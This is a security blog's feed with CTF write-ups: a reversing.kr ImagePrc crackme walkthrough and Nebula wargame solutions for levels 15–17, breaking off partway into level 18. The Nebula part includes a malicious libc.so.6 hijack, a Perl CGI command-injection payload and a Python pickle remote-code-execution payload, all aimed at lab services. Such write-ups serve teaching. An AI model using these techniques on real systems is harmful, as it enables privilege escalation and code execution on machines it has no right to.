<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>GreatYYX Blog</title><link href="http://blog.yyx.name/" rel="alternate"></link><link href="http://blog.yyx.name/feeds%5Cgreatyyx.atom.xml" rel="self"></link><id>http://blog.yyx.name/</id><updated>2014-09-23T18:05:00+08:00</updated><entry><title>reversing.kr ImagePrc Walkthrough</title><link href="http://blog.yyx.name/posts/reversing-kr-imageprc.html" rel="alternate"></link><updated>2014-09-23T18:05:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-23:posts/reversing-kr-imageprc.html</id><summary type="html">&lt;h1&gt;试玩&lt;/h1&gt;
&lt;p&gt;看起来很有意思的一道题目。拿到后打开一个窗口，可以用鼠标画一些东西，之后点Check，弹出“Wrong”。直觉认为应该是要画出一个图像，正确的话会得到flag。可惜这个图能画正确的概率真的很低。&lt;/p&gt;
&lt;h1&gt;逻辑分析&lt;/h1&gt;
&lt;p&gt;OD打开之后下MessageBoxA的API断点或者WM_LBUTTONUP的消息断点，点击Check后断下并跟踪到核心逻辑代码的位置。&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;004012D6   &amp;gt; \83BC24 940000&amp;gt;cmp dword ptr ss:[esp+0x94],0x64         ;  Case 111 (WM_COMMAND) of switch 0040113A
004012DE   .  0F85 01020000 jnz ImagePrc.004014E5
...
004013CD   &amp;gt;  8B8424 900000&amp;gt;mov eax,dword ptr ss:[esp+0x90]
004013D4   .  6A 30         push 0x30                                ; /Style = MB_OK|MB_ICONEXCLAMATION|MB_APPLMODAL
004013D6   .  68 34604000   push ImagePrc.00406034                   ; |ImagePrc
004013DB   .  68 40604000   push ImagePrc.00406040                   ; |Wrong
004013E0   .  50            push eax                                 ; |hOwner
004013E1   .  FF15 F8504000 call dword ptr ds:[&amp;lt;&amp;amp;USER32.MessageBoxA&amp;gt;&amp;gt;; \MessageBoxA
004013E7   .  56            push esi
004013E8   .  E8 13010000   call ImagePrc.00401500
004013ED   .  83C4 04       add esp,0x4
004013F0   .  33C0          xor eax,eax
004013F2   .  5B            pop ebx
004013F3   .  5F            pop edi
004013F4   .  5E            pop esi
004013F5   .  81C4 80000000 add esp,0x80
004013FB   .  C2 1000       retn 0x10
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在按钮消息路由到弹出消息框之间就是我们要找的核心逻辑。下面分解一下逻辑：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
004012E4   .  A1 F4844000   mov eax,dword ptr ds:[0x4084F4]
004012E9   .  8D5424 08     lea edx,dword ptr ss:[esp+0x8]
004012ED   .  53            push ebx
004012EE   .  52            push edx                                 ; /Buffer = 0018FB04
004012EF   .  6A 18         push 0x18                                ; |BufSize = 18 (24.)
004012F1   .  50            push eax                                 ; |hObject =&amp;gt; B9051E9B
004012F2   .  FF15 1C504000 call dword ptr ds:[&amp;lt;&amp;amp;GDI32.GetObjectA&amp;gt;]  ; \GetObjectA
004012F8   .  B9 0A000000   mov ecx,0xA
004012FD   .  33C0          xor eax,eax
004012FF   .  8D7C24 24     lea edi,dword ptr ss:[esp+0x24]
00401303   .  8D5424 24     lea edx,dword ptr ss:[esp+0x24]
00401307   .  F3:AB         rep stos dword ptr es:[edi]
00401309   .  8B4424 14     mov eax,dword ptr ss:[esp+0x14]
0040130D   .  8B4C24 10     mov ecx,dword ptr ss:[esp+0x10]
00401311   .  8B3D 20504000 mov edi,dword ptr ds:[&amp;lt;&amp;amp;GDI32.GetDIBits&amp;gt;&amp;gt;;  GDI32.GetDIBits
00401317   .  6A 00         push 0x0                                 ; /Usage = DIB_RGB_COLORS
00401319   .  52            push edx                                 ; |pBitmapinfo
0040131A   .  6A 00         push 0x0                                 ; |Buffer = NULL
0040131C   .  894424 38     mov dword ptr ss:[esp+0x38],eax          ; |
00401320   .  50            push eax                                 ; |nLines
00401321   .  A1 F4844000   mov eax,dword ptr ds:[0x4084F4]          ; |
00401326   .  894C24 38     mov dword ptr ss:[esp+0x38],ecx          ; |
0040132A   .  8B0D DC844000 mov ecx,dword ptr ds:[0x4084DC]          ; |
00401330   .  6A 00         push 0x0                                 ; |StartLine = 0
00401332   .  50            push eax                                 ; |hBitmap =&amp;gt; B9051E9B
00401333   .  51            push ecx                                 ; |hDC =&amp;gt; 4C01191B
00401334   .  C74424 40 280&amp;gt;mov dword ptr ss:[esp+0x40],0x28         ; |
0040133C   .  66:C74424 4C &amp;gt;mov word ptr ss:[esp+0x4C],0x1           ; |
00401343   .  66:C74424 4E &amp;gt;mov word ptr ss:[esp+0x4E],0x18          ; |
0040134A   .  C74424 50 000&amp;gt;mov dword ptr ss:[esp+0x50],0x0          ; |
00401352   .  FFD7          call edi                                 ; \GetDIBits
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;程序首先获取绘制的对象，并提取绘制对象的像素内容。在&lt;code&gt;GetDIBits()&lt;/code&gt;的时候栈情况如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
0018FADC   4C01191B  |hDC = 4C01191B
0018FAE0   B9051E9B  |hBitmap = B9051E9B
0018FAE4   00000000  |StartLine = 0
0018FAE8   00000096  |nLines = 96 (150.)
0018FAEC   00000000  |Buffer = NULL
0018FAF0   0018FB1C  |pBitmapinfo = 0018FB1C
0018FAF4   00000000  \Usage = DIB_RGB_COLORS
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到图像为RGB图像，第一个扫描线是150（其实就是150的高度）。查看地址0018FB1C处数据的LPBITMAPINFO结构体指针的内容：&lt;/p&gt;
&lt;pre&gt;&lt;code class="ascii"&gt;...
0018FB1C  28 00 00 00 C8 00 00 00 96 00 00 00 01 00 18 00  (.È..
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;根据BITMAPINFO结构体格式，发现bitmap的长度是0xC8，高度0x96，即200x150大小。&lt;/p&gt;
&lt;p&gt;接着往下看：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
00401381   .  6A 18         push 0x18                                ; /ResourceType = 18
00401383   .  6A 65         push 0x65                                ; |ResourceName = 65
00401385   .  6A 00         push 0x0                                 ; |hModule = NULL
00401387   .  FF15 7C504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.FindResour&amp;gt;; \FindResourceA
0040138D   .  50            push eax                                 ; /hResource
0040138E   .  6A 00         push 0x0                                 ; |hModule = NULL
00401390   .  FF15 80504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LoadResour&amp;gt;; \LoadResource
00401396   .  50            push eax                                 ; /hResource
00401397   .  FF15 88504000 call dword ptr ds:[&amp;lt;&amp;amp;KERNEL32.LockResour&amp;gt;; \LockResource
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后程序从自身获取资源编号为0x65、类型是0x18的资源并加载。这里提一句，&lt;code&gt;FindResource()&lt;/code&gt;返回的eax指向的数据区构造如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class="ascii"&gt;0047E048  60 E0 07 00 90 5F 01 00 00 00 00 00 00 00 00 00  徐....
0047E058  00 00 00 00 00 00 00 00 FF FF FF FF FF FF FF FF  ........
0047E068  FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF  ........
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到第0-4个字节0x0007E060是资源真正的起始地址的偏移，5-8个字节0x00105F90是资源大小，0047E060才是资源数据内容的起始。这就是PE文件对于资源的布局（当然不知道也能解题）。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;LoadResource()&lt;/code&gt;并Lock之后，进入如下逻辑：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;...
0040139D   .  33FF          xor edi,edi
0040139F   .  8BCE          mov ecx,esi
004013A1   .  2BC6          sub eax,esi
004013A3   &amp;gt;  8A11          mov dl,byte ptr ds:[ecx]
004013A5   .  8A1C08        mov bl,byte ptr ds:[eax+ecx]
004013A8   .  3AD3          cmp dl,bl
004013AA      75 21         jnz XImagePrc.004013CD
004013AC   .  47            inc edi
004013AD   .  41            inc ecx
004013AE      81FF 905F0100 cmp edi,0x15F90
004013B4   .^ 7C ED         jl XImagePrc.004013A3
004013B6   .  56            push esi
004013B7   .  E8 44010000   call ImagePrc.00401500
004013BC   .  83C4 04       add esp,0x4
004013BF   .  33C0          xor eax,eax
004013C1   .  5B            pop ebx
004013C2   .  5F            pop edi
004013C3   .  5E            pop esi
004013C4   .  81C4 80000000 add esp,0x80
004013CA &amp;gt; .  C2 1000       retn 0x10
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这段逻辑很简单，一个循环，一共循环0x15F90次（刚好是上面分析的资源的大小）。之后把绘制的图像数据和资源图像数据分别放入dl和bl进行每个byte的逐一比较。一开始我以为只要比较结果正确就能拿到flag，所以直接修改比较次数为0，可惜程序正常执行，却没有flag的踪迹。所以思路转为从资源入手。&lt;/p&gt;
&lt;h1&gt;资源操作&lt;/h1&gt;
&lt;p&gt;打开exeScope之类的资源提取工具，提取编号0x65的资源，发现大小是0X15F80，比我们需要的数据小0x10个字节。于是重新跟程序到&lt;code&gt;LoadResource()&lt;/code&gt;执行后，eax为47e060，提取47e060-493ff0一共0X15F90字节所有数据到文件。发现其实最后0x10个字节直接被填充为全0。&lt;/p&gt;
&lt;p&gt;二进制文件提取出来后，需要让它作为图像显示出来。文件大小为0X15F90，十进制是9000，相当于200x150x3，也就是200x150的RGB三通道图像。我这边直接利用Python的&lt;a href="https://github.com/python-pillow/Pillow/"&gt;Pillow图像处理库&lt;/a&gt;做还原（Python3的PIL为Pillow）：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;from PIL import Image

width = 200
height = 150

fp = open('rgb.mem', 'rb')
data = fp.read()
im = Image.frombytes('RGB', (width, height), data)
im = im.transpose(Image.FLIP_TOP_BOTTOM)
im.show()
im.save('result.bmp')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提取后发现图片是上下颠倒的，不知道是由于作者故意做成颠倒的还是WinAPI中GetDIBits是倒着读的。所以使用&lt;code&gt;transpose()&lt;/code&gt;做翻转。之后可以看到作者绘制的内容为GOT三个字符，即为flag。&lt;/p&gt;</summary><category term="reversing.kr"></category><category term="wargame"></category><category term="hacking"></category><category term="reversing"></category></entry><entry><title>Exploit Exercises Nebula level15-19 Writeup</title><link href="http://blog.yyx.name/posts/exploit-exercises-nebula-level-15-19.html" rel="alternate"></link><updated>2014-09-17T16:02:00+08:00</updated><author><name>GreatYYX</name></author><id>tag:blog.yyx.name,2014-09-17:posts/exploit-exercises-nebula-level-15-19.html</id><summary type="html">&lt;h1&gt;Nebula level15&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary.&lt;/p&gt;
&lt;p&gt;You may wish to review how to "compile a shared library in linux" and how the libraries are loaded and processed by reviewing the dlopen manpage in depth.&lt;/p&gt;
&lt;p&gt;Clean up after yourself :)&lt;/p&gt;
&lt;p&gt;利用strace查看flag15，看是否能发现异常。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;直接strace一下flag15：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level15@nebula:/home/flag15$ strace ./flag15
...
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7769000
access(&amp;quot;/etc/ld.so.preload&amp;quot;, R_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2/cmov&amp;quot;, 0xbf977ab4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/i686/sse2&amp;quot;, 0xbf977ab4) = -1 ENOENT (No such file or directory)
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看见程序大量调用了libc.so.6，但是libc.so.6本身却不存在。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;readelf&lt;/code&gt;命令发现flag15对于libc.so.6存在依赖：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;level15@nebula:/home/flag15$ readelf -d ./flag15

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;因此我们需要写libc.so.6，并放到&lt;code&gt;/var/tmp/flag15&lt;/code&gt;路径下，让.so的函数直接去getflag。&lt;/p&gt;
&lt;p&gt;下面就是从哪个函数下手的问题：最方便的莫过于那些自动执行的函数，比如共享库本身加载时候需要执行的函数，Google后找到这几个：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;__attribute__((constructor)) void init(void) { ... }
__attribute__((destructor))  void fini(void) { ... }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这是GCC特有的函数，当然也有一个相对通用的解决方案，使用内核的启动函数：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;int __libc_start_main(
    int (*main) (int, char * *, char * *),
    int argc,
    char **ubp_av,
    void (*init) (void),
    void (*fini) (void),
    void (*rtld_fini) (void),
    void(* stack_end)
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;我这里用这个参数长的BT的启动函数来写共享库：&lt;/p&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;unistd.h&amp;gt;
int __libc_start_main(
    int (*main) (int, char * *, char * *), int argc,
    char **ubp_av, void (*init) (void), void (*fini) (void),
    void (*rtld_fini) (void), void(* stack_end))
{
    execl(&amp;quot;/bin/getflag&amp;quot;, (char *)NULL, (char *)NULL);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可是，执行flag15后提示:&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by ./flag15)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
./flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;两个错误，一个找不到符号，一个缺少GLIBC_2.1.3版本定义。Google后得到静态链接配合version script的方案，创建一个version文件：&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;GLIBC_2.0 {
};
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后编译：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o /var/tmp/flag15/libc.so.6 libc.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如此，即可成功运行getflag。&lt;/p&gt;
&lt;h1&gt;Nebula level16&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a perl script running on port 1616.&lt;/p&gt;
&lt;p&gt;有个perl脚本在1616端口运行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="perl"&gt;#!/usr/bin/env perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/;  # conver to uppercase
  $username =~ s/\s.*//;    # strip everything after a space

  @output = `egrep &amp;quot;^$username&amp;quot; /home/flag16/userdb.txt 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) {
    ($usr, $pw) = split(/:/, $line);


    if($pw =~ $password) { 
      return 1;
    }
  }

  return 0;
}

sub htmlz {
  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Login resuls&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;quot;);
  if($_[0] == 1) {
    print(&amp;quot;Your login was accepted&amp;lt;br/&amp;gt;&amp;quot;);
  } else {
    print(&amp;quot;Your login failed&amp;lt;br/&amp;gt;&amp;quot;);
  }  
  print(&amp;quot;Would you like a cookie?&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;\n&amp;quot;);
}

htmlz(login(param(&amp;quot;username&amp;quot;), param(&amp;quot;password&amp;quot;)));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先来看代码逻辑，get两个参数username和password，将username全部转换成大写并去掉空格，之后执行egrep命令，并匹配password。egrep是shell命令，这里就是这道题的突破口。&lt;/p&gt;
&lt;p&gt;但是，Linux是区分大小写的系统，所以需要想办法构造名称为大写的脚本并完成漏洞的利用。不过，Linux的根目录没有写入权限，一级目录也没有大写名字的目录，该如何处理？这里用到了通配符技巧。&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;level16@nebula:~$ touch /tmp/TEST16
level16@nebula:~$ ls /*/TEST16
/tmp/TEST16
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;于是构造一个脚本/tmp/EXP16，并给予x权限：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;#! /bin/bash
/bin/getflag &amp;gt; /tmp/flag16.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;之后构造参数：&lt;/p&gt;
&lt;pre&gt;&lt;code class="no-highlight"&gt;username=&amp;quot;&amp;lt;/DEV/NULL;/*/EXP16;#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中第一个&lt;code&gt;"&lt;/code&gt;用于闭合，&lt;code&gt;&amp;lt;/DEV/NULL&lt;/code&gt;是给egrep的输入参数，之后是漏洞利用的命令，最后的&lt;code&gt;#&lt;/code&gt;用于注释掉后面的语句。&lt;/p&gt;
&lt;p&gt;最后将构造好的参数编码并执行：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;wget http://127.0.0.1:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3B%2F%2A%2FEXP%3B%23 -O /dev/null
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;从/tmp/flag16.txt中可以发现成功getflag。&lt;/p&gt;
&lt;h1&gt;Nebula level17&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a python script listening on port 10007 that contains a vulnerability.&lt;/p&gt;
&lt;p&gt;在监听10007端口的python脚本有漏洞。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="python"&gt;#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
    clnt.send(&amp;quot;why did you send me &amp;quot; + i + &amp;quot;?\n&amp;quot;)

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
    clnt.send(&amp;quot;Accepted connection from %s:%d&amp;quot; % (addr[0], addr[1]))
    server(clnt)
    exit(1)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Python写的一个socket服务器，服务器一运行就对接收到的数据用pickle进行反序列化。序列化/反序列化就意味对象可以被存储，因此也有可能被运行。网上可以搜索一下Pickle Exploit相关信息，可谓一抓一大把。&lt;/p&gt;
&lt;p&gt;这题思路就是从pickle下手，查询了Python Manual后发现，dumps()/loads()函数可以序列化转换对象和byte。&lt;/p&gt;
&lt;p&gt;现在有了存储和恢复对象的方法，下一步就是如何让对象内的方法运行。php有魔数方法，python应该也有。继续看手册中pickle这章，发现在恢复对象的时候&lt;code&gt;__init__()&lt;/code&gt;和&lt;code&gt;__new__()&lt;/code&gt;是不会被调用的，但是有&lt;code&gt;__reduce__()&lt;/code&gt;，不过需要返回tuple或者string。&lt;/p&gt;
&lt;p&gt;于是构造代码：&lt;/p&gt;
&lt;pre&gt;&lt;code class="python"&gt;import pickle
import os

class Exp17(object):
    def __reduce__(self):
        return (os.system, ('/bin/getflag &amp;gt; /tmp/flag17.txt',))

obj = pickle.dumps(Exp17())
# pickle.loads(obj)
print obj
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面代码中注释掉的那句是我用来测试的代码，测试正常后就可以开始漏洞利用了：&lt;/p&gt;
&lt;pre&gt;&lt;code class="bash"&gt;python exp17.py | nc 127.0.0.1 10007
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;运行代码，让nc建立连接并回车，之后Ctrl+C停止运行，去/tmp/flag17.txt看成果吧。&lt;/p&gt;
&lt;h1&gt;Nebula level18&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Analyse the C program, and look for vulnerabilities in the program. There is an easy way to solve this level, an intermediate way to solve it, and a more difficult/unreliable way to solve it.&lt;/p&gt;
&lt;p&gt;分析C程序漏洞，这道题有简单、中等、困难且不可靠3种方式去解决。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code class="cpp"&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;getopt.h&amp;gt;

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile &amp;amp;&amp;amp; globals.verbose &amp;gt;= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE &amp;quot;/home/flag18/password&amp;quot;

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, &amp;quot;r&amp;quot;);
  if(fp) {
    char file[64];

    if(fgets(file, sizeof(file) - 1, fp) == NULL) {
      dprintf(&amp;quot;Unable to read password file %s\n&amp;quot;, PWFILE);
      return;
    }
                fclose(fp);
    if(strcmp(pw, file) != 0) return;    
  }
  dprintf(&amp;quot;logged in successfully (with%s password file)\n&amp;quot;, 
    fp == NULL ? &amp;quot;out&amp;quot; : &amp;quot;&amp;quot;);

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&amp;amp;buffer, &amp;quot;--&amp;gt; [%s] is unsupported at this current time.\n&amp;quot;, what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, &amp;quot;unable to set user to '%s' -- not supported.\n&amp;quot;, user);
  printf(&amp;quot;%s\n&amp;quot;, msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, &amp;quot;d:v&amp;quot;)) != -1) {
    switch(c) {
      case 'd':
        globals.debugfile = fopen(optarg, &amp;quot;w+&amp;quot;);
        if(globals.debugfile == NULL) err(1, &amp;quot;Unable to open %s&amp;quot;, optarg);
        setvbuf(globals.debugfile, NULL, _IONBF, 0);
        break;
      case 'v':
        globals.verbose++;
        break;
    }
  }

  dprintf(&amp;quot;Starting up. Verbose level = %d\n&amp;quot;, globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
    char line[256];
    char *p, *q;

    q = fgets(line, sizeof(line)-1, stdin);
    if(q == NULL) break;
    p = strchr(line, '\n'); if(p) *p = 0;
    p = strchr(line, '\r'); if(p) *p = 0;

    dvprintf(2, &amp;quot;got [%s] as input\n&amp;quot;, line);

    if(strncmp(line, &amp;quot;login&amp;quot;, 5) == 0) {
      dvprintf(3, &amp;quot;attempting to login\n&amp;quot;);
      login(line + 6);
    } else if(strncmp(line, &amp;quot;logout&amp;quot;, 6) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, &amp;quot;shell&amp;quot;, 5) == 0) {
      dvprintf(3, &amp;quot;attempting to start shell\n&amp;quot;);
      if(globals.loggedin) {
        execve(&amp;quot;/bin/sh&amp;quot;, argv, envp);
        err(1, &amp;quot;unable to execve&amp;quot;);
      }
      dprintf(&amp;quot;Permission denied\n&amp;quot;);
    } else if(strncmp(line, &amp;quot;logout&amp;quot;, 4) == 0) {
      globals.loggedin = 0;
    } else if(strncmp(line, &amp;quot;closelog&amp;quot;, 8) == 0) {
      if(globals.debugfile) fclose(globals.debugfile);
      globals.debugfile = NULL;
    } else if(strncmp(line, &amp;quot;site exec&amp;quot;, 9) == 0) {
      notsupported(line + 10);
    } else if(strncmp(line, &amp;quot;setuser&amp;quot;, 7) == 0) {
      setuser(line + 8);
    }
  }

  return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;看到这段长长的C代码就感到心累啊，其实这段代码的框架是标准的Linux命令行程序，模拟了一个小小的shell。&lt;/p&gt;
&lt;p&gt;解释一下程序大的框架：直接看main函数，程序启动后通过&lt;code&gt;getopt()&lt;/code&gt;解析参数，含参参数d和不含参参数v，d参数后面跟着的参数为文件路径，而v则让全局结构体中verbose变量自增。之后进入无限循环，从标准输入中获取输入（要求\r\n结尾），对于输入执行相关函数或操作。之后看宏定义：两个宏用于调试输出，而全局结构体中的verbose就是指定调试等级的，所有调试内容会输出到刚才d参数后的参数指定的路径中。&lt;/p&gt;
&lt;p&gt;反汇编程序后找到一个突破口在login函数中：&lt;/p&gt;
&lt;pre&gt;&lt;code class="x86asm"&gt;0x08048c50 &amp;lt;+0&amp;gt;:    sub    $0x6c,%esp
0x08048c53 &amp;lt;+3&amp;gt;:    mov    %ebx,0x60(%esp)
0x08048c57 &amp;lt;+7&amp;gt;:    mov    %edi,0x68(%esp)
0x08048c5b &amp;lt;+11&amp;gt;:   mov    0x70(%esp),%edi
0x08048c5f &amp;lt;+15&amp;gt;:   mov    %gs:0x14,%eax
0x08048c65 &amp;lt;+21&amp;gt;:   mov    %eax,0x5c(%esp)
0x08048c69 &amp;lt;+25&amp;gt;:   xor    %eax,%eax
0x08048c6b &amp;lt;+27&amp;gt;:   mov    %esi,0x64(%esp)
0x08048c6f &amp;lt;+31&amp;gt;:   movl   $0x8048fba,0x4(%esp)
0x08048c77 &amp;lt;+39&amp;gt;:   movl   $0x8048ef0,(%esp)
0x08048c7e &amp;lt;+46&amp;gt;:   call   0x8048750 &amp;lt;fopen@plt&amp;gt;
0x08048c83 &amp;lt;+51&amp;gt;:   test   %eax,%eax
0x08048c85 &amp;lt;+53&amp;gt;:   mov    %eax,%ebx
0x08048c87 &amp;lt;+55&amp;gt;:   je     0x8048cb5 &amp;lt;login+101&amp;gt;
0x08048c89 &amp;lt;+57&amp;gt;:   lea    0x1c(%esp),%esi
0x08048c8d &amp;lt;+61&amp;gt;:   mov    %eax,0x8(%esp)
0x08048c91 &amp;lt;+65&amp;gt;:   movl   $0x3f,0x4(%esp)
0x08048c99 &amp;lt;+73&amp;gt;:   mov    %esi,(%esp)
0x08048c9c &amp;lt;+76&amp;gt;:   call   0x8048670 &amp;lt;fgets@plt&amp;gt;
0x08048ca1 &amp;lt;+81&amp;gt;:   test   %eax,%eax
0x08048ca3 &amp;lt;+83&amp;gt;:   je     0x8048d18 &amp;lt;login+200&amp;gt;
0x08048ca5 &amp;lt;+85&amp;gt;:   mov    %esi,0x4(%esp)
0x08048ca9 &amp;lt;+89&amp;gt;:   mov    %edi,(%esp)
0x08048cac &amp;lt;+92&amp;gt;:   call   0x8048640 &amp;lt;strcmp@plt&amp;gt;
0x08048cb1 &amp;lt;+97&amp;gt;:   test   %eax,%eax
0x08048cb3 &amp;lt;+99&amp;gt;:   jne    0x8048cf4 &amp;lt;login+164&amp;gt;
0x08048cb5 &amp;lt;+101&amp;gt;:  mov    0x804b0ac,%edx
0x08048cbb &amp;lt;+107&amp;gt;:  test   %edx,%edx
0x08048cbd &amp;lt;+109&amp;gt;:  je     0x8048cea &amp;lt;login+154&amp;gt;
0x08048cbf &amp;lt;+111&amp;gt;:  mov    $0x8048f50,%eax
0x08048cc4 &amp;lt;+116&amp;gt;:  test   %ebx,%ebx
0x08048cc6 &amp;lt;+118&amp;gt;:  mov    $0x8048fa0,%ecx
0x08048ccb &amp;lt;+123&amp;gt;:  cmovne %ecx,%eax
0x08048cce &amp;lt;+126&amp;gt;:  mov    %eax,0xc(%esp)
0x08048cd2 &amp;lt;+130&amp;gt;:  movl   $0x8048fe0,0x8(%esp)
0x08048cda &amp;lt;+138&amp;gt;:  movl   $0x1,0x4(%esp)
0x08048ce2 &amp;lt;+146&amp;gt;:  mov    %edx,(%esp)
0x08048ce5 &amp;lt;+149&amp;gt;:  call   0x8048770 &amp;lt;__fprintf_chk@plt&amp;gt;
0x08048cea &amp;lt;+154&amp;gt;:  movl   $0x1,0x804b0b4
0x08048cf4 &amp;lt;+164&amp;gt;:  mov    0x5c(%esp),%eax
0x08048cf8 &amp;lt;+168&amp;gt;:  xor    %gs:0x14,%eax
0x08048cff &amp;lt;+175&amp;gt;:  jne    0x8048d43 &amp;lt;login+243&amp;gt;
